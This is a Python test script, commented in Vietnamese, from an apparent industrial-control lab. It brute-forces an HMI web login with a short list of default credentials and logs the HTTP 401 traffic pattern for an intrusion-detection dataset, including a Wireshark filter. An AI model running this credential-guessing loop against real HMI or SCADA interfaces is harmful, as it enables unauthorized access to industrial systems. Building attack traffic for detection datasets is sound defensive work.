#!/usr/bin/env python3
"""
tests/test_hmi_brute.py
Brute-force HTTP login endpoint cua HMI web.
PLC khong thay doi — dau vet la HTTP 401 lien tiep.

Chay: python tests/test_hmi_brute.py
"""

import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

WORDLIST = [
    ("admin", "wrong1"),
    ("admin", "wrong2"),
    ("operator", "wrong1"),
    ("admin", "admin123"),
    ("admin", "admin"),
    ("root", "root"),
    ("admin", "password"),
]


def main():
    print(f"\n{B}[TEST] HMI_CREDENTIAL_BRUTE{X}")
    info(f"Target: {HMI_URL}/login")
    info("PLC KHONG thay doi — dau vet la HTTP 401 lien tiep")

    changes = []
    observable = []
    notes = []
    error = None
    success = False
    t0 = time.time()
    attempts = 0
    found = []

    try:
        import requests

        probe = requests.get(HMI_URL, timeout=3)
        ok(f"HMI web online: HTTP {probe.status_code}")
    except Exception as e:
        fail(f"HMI web khong phan hoi: {e}")
        notes.append(f"Kiem tra HMI_URL={HMI_URL} va port")
        print_result("HMI_CREDENTIAL_BRUTE", False, [], [], notes, time.time() - t0, str(e))
        return

    print(f"\n  {'User':<12} {'Password':<12} {'HTTP':<8} Ket qua")
    print(f"  {'-'*45}")

    for user, pwd in WORDLIST:
        try:
            r = requests.post(
                f"{HMI_URL}/login",
                data={"username": user, "password": pwd},
                timeout=3,
                allow_redirects=False,
            )
            attempts += 1
            code = r.status_code

            if code in [200, 302]:
                result = f"{G}FOUND{X}"
                found.append(f"{user}:{pwd}")
            elif code == 401:
                result = "401"
            elif code == 403:
                result = "403 (blocked)"
            else:
                result = f"? {code}"

            print(f"  {user:<12} {pwd:<12} {code:<8} {result}")
            time.sleep(0.3)

        except Exception as e:
            print(f"  {user:<12} {pwd:<12} {'ERR':<8} {e}")

    observable.append(f"HTTP POST /login: {attempts} requests trong {time.time() - t0:.1f}s")
    observable.append("CIC: nhieu flow ngan den port 80/5000, HTTP 401 lien tiep")

    if found:
        ok(f"Tim duoc credentials: {found}")
        notes.append(f"Credentials hop le: {found}")
    else:
        info("Khong tim duoc credential dung — nhung traffic pattern da tao ra")
        notes.append("Traffic pattern brute-force da co trong pcap — du cho dataset")

    notes.append("Wireshark: http.request.method == POST && http.response.code == 401")
    success = attempts > 0

    print_result("HMI_CREDENTIAL_BRUTE", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
